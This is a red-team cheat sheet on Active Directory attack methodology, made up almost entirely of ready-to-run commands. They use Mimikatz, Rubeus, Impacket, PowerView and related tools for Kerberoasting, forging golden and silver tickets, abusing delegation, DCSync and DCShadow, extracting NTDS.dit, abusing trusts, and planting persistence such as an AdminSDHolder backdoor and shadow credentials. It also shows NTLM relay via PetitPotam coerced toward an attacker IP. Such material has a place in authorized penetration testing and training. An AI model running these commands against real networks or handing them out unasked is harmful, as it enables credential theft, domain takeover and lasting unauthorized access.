# Active Directory Attack Methodology

## Overview
Active Directory (AD) is the backbone of enterprise Windows networks. Attacking AD involves reconnaissance, credential harvesting, privilege escalation, and persistence techniques targeting Kerberos authentication and domain trust relationships.

*Source: Based on ired.team red team notes*

---

## Kerberos Attacks

### Kerberoasting
Extract TGS tickets for service accounts and crack them offline.

```powershell
# Using Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# Using Impacket
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 -request

# Using PowerView
Invoke-Kerberoast -OutputFormat Hashcat | Select Hash | Out-File hashes.txt
```

**Crack with Hashcat:**
```bash
hashcat -m 13100 hashes.txt wordlist.txt
```

### AS-REP Roasting
Target accounts without Kerberos pre-authentication.

```powershell
# Using Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Using Impacket
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.1 -format hashcat
```

**Crack with Hashcat:**
```bash
hashcat -m 18200 asrep.txt wordlist.txt
```

### Golden Ticket
Forge TGT using krbtgt hash for persistent domain access.

```powershell
# Get krbtgt hash via DCSync
mimikatz# lsadump::dcsync /domain:domain.local /user:krbtgt

# Create golden ticket
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Using Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator
```

### Silver Ticket
Forge service ticket for specific service access.

```powershell
# Create silver ticket for CIFS (file share access)
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:dc01.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

---

## Delegation Attacks

### Unconstrained Delegation
Compromise any user that authenticates to a server with unconstrained delegation.

```powershell
# Find unconstrained delegation computers
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# Using PowerView
Get-DomainComputer -Unconstrained

# Monitor for TGTs (on compromised server)
Rubeus.exe monitor /interval:5
```

### Constrained Delegation
Abuse constrained delegation to impersonate users.

```powershell
# Find constrained delegation
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

# Request ticket and impersonate
Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc01.domain.local /ptt
```

### Resource-Based Constrained Delegation (RBCD)
Modify msDS-AllowedToActOnBehalfOfOtherIdentity for computer takeover.

```powershell
# Add computer account
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Set RBCD
Set-ADComputer target$ -PrincipalsAllowedToDelegateToAccount FAKE01$

# Get ticket
Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
```

---

## Domain Controller Attacks

### DCSync
Replicate credentials from DC (requires Replicating Directory Changes permissions).

```powershell
# Using Mimikatz
mimikatz# lsadump::dcsync /domain:domain.local /user:Administrator
mimikatz# lsadump::dcsync /domain:domain.local /all /csv

# Using Impacket
secretsdump.py domain.local/admin:password@dc01.domain.local
```

### DCShadow
Register rogue DC to push malicious changes.

```powershell
# Requires SYSTEM + Domain Admin
mimikatz# lsadump::dcshadow /object:targetuser /attribute:primaryGroupID /value:512
mimikatz# lsadump::dcshadow /push
```

### NTDS.dit Extraction
Extract AD database for offline cracking.

```powershell
# Create shadow copy
vssadmin create shadow /for=C:

# Copy NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# Extract hashes
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

---

## Trust Abuse

### Parent-Child Domain Trust
Escalate from child domain admin to enterprise admin.

```powershell
# Get trust key
mimikatz# lsadump::trust /patch

# Create inter-realm TGT
mimikatz# kerberos::golden /user:Administrator /domain:child.domain.local /sid:CHILD_SID /sids:ENTERPRISE_ADMINS_SID /krbtgt:TRUST_KEY /ptt
```

### Forest Trust Abuse
Exploit SID history filtering misconfiguration.

```powershell
# If SID filtering disabled
mimikatz# kerberos::golden /user:Administrator /domain:forest1.local /sid:FOREST1_SID /sids:FOREST2_ENTERPRISE_ADMINS /krbtgt:HASH /ptt
```

---

## Persistence Techniques

### AdminSDHolder Backdoor
Modify AdminSDHolder ACL for persistent admin access.

```powershell
# Add user to AdminSDHolder ACL
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity backdoor_user -Rights All

# Wait for SDProp (60 min) or force
Invoke-ADSDPropagation
```

### Shadow Credentials
Add Key Credential for persistent authentication.

```powershell
# Using Whisker
Whisker.exe add /target:dc01$ /domain:domain.local /dc:dc01.domain.local

# Authenticate with certificate
Rubeus.exe asktgt /user:dc01$ /certificate:cert.pfx /password:pass /ptt
```

### ADCS Abuse (PetitPotam + NTLM Relay)
Obtain DC machine certificate for domain compromise.

```bash
# Start NTLM relay to ADCS
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC authentication
PetitPotam.py attacker_ip dc01.domain.local

# Use certificate for DCSync
Rubeus.exe asktgt /user:dc01$ /certificate:base64_cert /ptt
```

---

## Reconnaissance Commands

### PowerView Enumeration
```powershell
# Domain info
Get-Domain
Get-DomainController

# Users and groups
Get-DomainUser -AdminCount
Get-DomainGroup -AdminCount
Get-DomainGroupMember "Domain Admins"

# Find delegation
Get-DomainComputer -TrustedToAuth
Get-DomainUser -TrustedToAuth

# ACL analysis
Find-InterestingDomainAcl -ResolveGUIDs
```

### BloodHound Collection
```powershell
# Using SharpHound
SharpHound.exe -c All

# Using BloodHound.py
bloodhound-python -d domain.local -u user -p pass -ns 10.10.10.1 -c All
```

---

## Tools Reference

| Tool | Purpose |
|------|---------|
| Mimikatz | Credential extraction, ticket forging |
| Rubeus | Kerberos abuse toolkit |
| Impacket | Python AD attack tools |
| PowerView | PowerShell AD enumeration |
| BloodHound | AD attack path visualization |
| Whisker | Shadow credentials |
| Certify | ADCS enumeration and abuse |
| PetitPotam | NTLM coercion |
